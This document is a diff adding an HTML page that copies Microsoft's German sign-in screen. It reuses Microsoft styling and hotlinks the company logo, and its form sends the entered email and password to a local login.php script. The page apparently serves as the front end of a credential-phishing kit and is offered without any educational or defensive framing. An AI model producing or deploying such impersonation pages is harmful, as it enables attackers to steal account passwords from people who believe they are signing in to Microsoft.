@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft – Anmelden</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial; background: #f2f2f2; }
+        .container { width: 440px; margin: 50px auto; background: white; padding: 44px; border-radius: 4px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+        img { width: 108px; margin-bottom: 16px; }
+        input { width: 100%; padding: 6px 10px; margin: 8px 0; border: 1px solid #666; border-radius: 0; }
+        button { background: #0067b8; color: white; border: none; padding: 10px 20px; margin-top: 20px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
+        <h2>Anmelden</h2>
+        <form method="POST" action="login.php">
+            <input type="email" name="email" placeholder="E-Mail, Telefon oder Skype" required>
+            <input type="password" name="password" placeholder="Passwort" required>
+            <button type="submit">Anmelden</button>
+        </form>
+    </div>
+</body>
+</html>
